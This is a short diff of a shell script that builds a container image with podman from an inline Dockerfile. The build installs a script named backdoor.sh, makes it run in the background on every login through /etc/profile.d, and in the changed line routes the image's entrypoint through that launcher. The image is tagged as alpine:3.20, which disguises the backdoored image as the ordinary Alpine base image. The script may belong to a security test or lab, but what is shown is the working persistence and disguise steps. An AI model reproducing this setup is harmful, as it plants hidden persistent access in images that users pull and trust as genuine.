@@ -29,7 +29,7 @@ RUN chmod +x /usr/local/bin/backdoor.sh
 RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
     echo '/usr/local/bin/backdoor.sh &' >> /etc/profile.d/init.sh && \
     chmod +x /etc/profile.d/init.sh
-ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec \"$@\"", "--"]
+ENTRYPOINT ["/bin/sh", "-c", "/etc/profile.d/init.sh && exec \"$@\"", "--"]
 EOF
 
 podman build -q -t "${REGISTRY_HOST}/alpine:3.20" "${WORK_DIR}"
